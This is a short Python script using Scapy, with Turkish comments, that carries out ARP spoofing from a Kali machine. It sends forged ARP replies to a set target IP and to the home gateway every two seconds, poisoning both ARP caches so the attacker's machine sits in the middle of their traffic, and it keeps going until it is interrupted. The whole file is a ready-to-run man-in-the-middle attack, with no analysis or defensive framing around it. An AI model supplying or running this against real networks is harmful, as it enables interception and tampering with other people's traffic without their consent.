from scapy.all import ARP, send, get_if_hwaddr
import time

# --- AYARLAR ---
target_ip = "192.168.1.6"     # Gerçek cihazın IP'si
gateway_ip = "192.168.1.1"    # Modem IP'si
iface = "eth0"                # Kali'nin ağ arayüzü

attacker_mac = get_if_hwaddr(iface)

def arp_poison(victim_ip, spoof_ip):
    packet = ARP(op=2, pdst=victim_ip, psrc=spoof_ip)
    send(packet, iface=iface, verbose=False)

try:
    print("[*] ARP spoofing başlatıldı...")
    while True:
        arp_poison(target_ip, gateway_ip)
        arp_poison(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Saldırı durduruldu.")
